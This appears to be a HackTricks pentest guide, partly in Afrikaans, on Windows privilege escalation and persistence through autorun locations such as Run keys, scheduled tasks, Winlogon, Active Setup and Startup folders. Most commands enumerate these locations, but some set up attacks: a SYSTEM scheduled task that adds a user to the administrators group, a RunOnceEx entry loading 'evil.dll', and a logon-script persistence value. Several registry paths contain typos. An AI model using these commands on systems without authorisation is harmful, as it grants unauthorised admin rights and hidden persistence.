# Privilege Escalation with Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** kan gebruik word om programme by **startup** te laat loop. Sien watter binaries geprogrammeer is om by startup te loop met:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Geskeduleerde Take

**Take** kan geskeduleer word om met **sekere frekwensie** te loop. Kyk watter binaries geskeduleer is om te loop met:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Folders

Al die binaries wat in die **Startup folders** geleë is, gaan by startup uitgevoer word. Die algemene startup folders is dié wat in die volgende lys verskyn, maar die startup folder word in die registry aangedui. [Lees dit om te leer waar.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Archive extraction *path traversal* vulnerabilities (such as the one abused in WinRAR prior to 7.13 – CVE-2025-8088) can be leveraged to **deposit payloads directly inside these Startup folders during decompression**, resulting in code execution on the next user logon.  Vir ’n diepduik in hierdie technique, sien:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): The **Wow6432Node** registry entry indicates that you are running a 64-bit Windows version. The operating system uses this key to display a separate view of HKEY_LOCAL_MACHINE\SOFTWARE for 32-bit applications that run on 64-bit Windows versions.

### Runs

**Commonly known** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry keys known as **Run** and **RunOnce** are designed to automatically execute programs every time a user logs into the system. The command line assigned as a key's data value is limited to 260 characters or less.

**Service runs** (can control automatic startup of services during boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

On Windows Vista and later versions, the **Run** and **RunOnce** registry keys are not automatically generated. Entries in these keys can either directly start programs or specify them as dependencies. For instance, to load a DLL file at logon, one could use the **RunOnceEx** registry key along with a "Depend" key. This is demonstrated by adding a registry entry to execute "C:\temp\evil.dll" during the system start-up:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: As jy binne enige van die genoemde registry in **HKLM** kan skryf, kan jy privileges eskaleer wanneer ’n ander user aanmeld.

> [!TIP]
> **Exploit 2**: As jy enige van die binaries wat in enige van die registry binne **HKLM** aangedui word kan oorskryf, kan jy daardie binary met ’n backdoor wysig wanneer ’n ander user aanmeld en privileges eskaleer.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Kortpaaie wat in die **Startup**-lêergids geplaas word, sal outomaties dienste of toepassings laat begin tydens gebruiker-aanmelding of stelselherlaai. Die ligging van die **Startup**-lêergids word in die register vir beide die **Local Machine**- en **Current User**-omgewings gedefinieer. Dit beteken enige kortpad wat by hierdie gespesifiseerde **Startup**-liggings gevoeg word, sal verseker dat die gekoppelde diens of program ná die aanmeld- of herlaaiproses begin, wat dit 'n eenvoudige metode maak om programme te skeduleer om outomaties te loop.

> [!TIP]
> As jy enige \[User] Shell Folder onder **HKLM** kan oorskryf, sal jy dit na 'n gids onder jou beheer kan wys en 'n backdoor daar plaas wat uitgevoer sal word enige keer as 'n gebruiker by die stelsel aanmeld, wat privileges eskaleer.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Hierdie per-gebruiker registerwaarde kan wys na ’n script of command wat uitgevoer word wanneer daardie user aanmeld. Dit is hoofsaaklik ’n **persistence**-primitief omdat dit net in die konteks van die geaffekteerde user loop, maar dit is steeds die moeite werd om na te gaan tydens post-exploitation en autoruns-oorsigte.

> [!TIP]
> As jy hierdie waarde vir die huidige user kan skryf, kan jy uitvoering weer aktiveer by die volgende interaktiewe aanmelding sonder admin rights. As jy dit vir ’n ander user hive kan skryf, kan jy moontlik code execution kry wanneer daardie user aanmeld.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notas:

- Verkies volledige paaie na `.bat`, `.cmd`, `.ps1`, of ander launcher-lêers wat reeds leesbaar is vir die teikengebruiker.
- Dit oorleef logoff/reboot totdat die waarde verwyder word.
- Anders as `HKLM\...\Run`, verleen dit **nie** op sigself elevation nie; dit is user-scope persistence.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Tipies is die **Userinit** key ingestel op **userinit.exe**. As hierdie key egter gewysig word, sal die gespesifiseerde executable ook deur **Winlogon** geloods word wanneer die gebruiker aanmeld. Net so is die **Shell** key bedoel om na **explorer.exe** te wys, wat die verstek shell vir Windows is.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> As jy die registry value of die binary kan oorskryf, sal jy privileges kan eskaleer.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Kyk na die **Run** key.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Verander die Safe Mode Command Prompt

In die Windows Registry onder `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, is daar ’n **`AlternateShell`**-waarde wat by verstek op `cmd.exe` gestel is. Dit beteken wanneer jy "Safe Mode with Command Prompt" kies tydens opstart (deur F8 te druk), word `cmd.exe` gebruik. Maar dit is moontlik om jou rekenaar so op te stel dat dit outomaties in hierdie modus begin sonder om F8 te hoef te druk en dit handmatig te kies.

Stappe om ’n boot option te skep om outomaties in "Safe Mode with Command Prompt" te begin:

1. Verander die attributes van die `boot.ini`-lêer om die read-only, system, en hidden flags te verwyder: `attrib c:\boot.ini -r -s -h`
2. Open `boot.ini` vir editing.
3. Voeg ’n lyn by soos: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Stoor die changes aan `boot.ini`.
5. Pas die oorspronklike file attributes weer toe: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Verander die **AlternateShell** registry key laat custom command shell setup toe, met potensiaal vir unauthorized access.
- **Exploit 2 (PATH Write Permissions):** As jy write permissions het na enige deel van die system **PATH** variable, veral voor `C:\Windows\system32`, kan jy ’n custom `cmd.exe` execute, wat as ’n backdoor kan dien as die system in Safe Mode begin word.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Write access tot `boot.ini` maak automatic Safe Mode startup moontlik, wat unauthorized access op die volgende reboot vergemaklik.

Om die huidige **AlternateShell**-instelling te check, gebruik hierdie commands:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Geïnstalleerde komponent

Active Setup is ’n funksie in Windows wat **voor die lessenaaromgewing ten volle gelaai is, begin**. Dit gee voorrang aan die uitvoering van sekere opdragte, wat klaar moet wees voordat die gebruiker-aanmelding voortgaan. Hierdie proses vind selfs plaas voordat ander opstartinskrywings, soos dié in die Run- of RunOnce-registerafdelings, geaktiveer word.

Active Setup word deur die volgende registersleutels bestuur:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Binne hierdie sleutels bestaan verskeie subsleutels, wat elk ooreenstem met ’n spesifieke komponent. Sleutelwaardes van besondere belang sluit in:

- **IsInstalled:**
- `0` dui aan dat die komponent se opdrag nie uitgevoer sal word nie.
- `1` beteken dat die opdrag een keer vir elke gebruiker uitgevoer sal word, wat die verstekgedrag is as die `IsInstalled`-waarde ontbreek.
- **StubPath:** Definieer die opdrag wat deur Active Setup uitgevoer moet word. Dit kan enige geldige command line wees, soos om `notepad` te begin.

**Sekuriteitsinsigte:**

- Om ’n sleutel te wysig of daarna te skryf waar **`IsInstalled`** op `"1"` gestel is met ’n spesifieke **`StubPath`**, kan lei tot ongemagtigde opdraguitvoering, moontlik vir privilege escalation.
- Die verander van die binary file waarna in enige **`StubPath`**-waarde verwys word, kan ook privilege escalation bewerkstellig, mits voldoende permissions bestaan.

Om die **`StubPath`**-konfigurasies oor Active Setup-komponente te inspekteer, kan hierdie commands gebruik word:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Oorsig van Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) is DLL modules wat ekstra kenmerke by Microsoft se Internet Explorer voeg. Hulle laai in Internet Explorer en Windows Explorer in by elke opstart. Tog kan hul uitvoering geblokkeer word deur die **NoExplorer**-sleutel op 1 te stel, wat verhoed dat hulle saam met Windows Explorer-instanse laai.

BHOs is versoenbaar met Windows 10 via Internet Explorer 11, maar word nie ondersteun in Microsoft Edge, die verstekblaaier in nuwer weergawes van Windows nie.

Om BHOs wat op 'n stelsel geregistreer is te verken, kan jy die volgende registry keys inspekteer:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Elke BHO word in die registry deur sy **CLSID** voorgestel, wat as 'n unieke identifiseerder dien. Gedetailleerde inligting oor elke CLSID kan gevind word onder `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Vir die navraag van BHOs in die registry, kan hierdie commands gebruik word:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Let op dat die registry 1 nuwe registry per elke dll sal bevat en dit sal deur die **CLSID** verteenwoordig word. Jy kan die CLSID-inligting vind in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Let wel dat al die plekke waar jy autoruns kan vind, **reeds deursoek word deur**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Maar, vir 'n **meer omvattende lys van outomaties uitgevoerde** lêers kan jy [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)van systinternals gebruik:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Meer

**Vind meer Autoruns soos registries in** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Verwysings

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
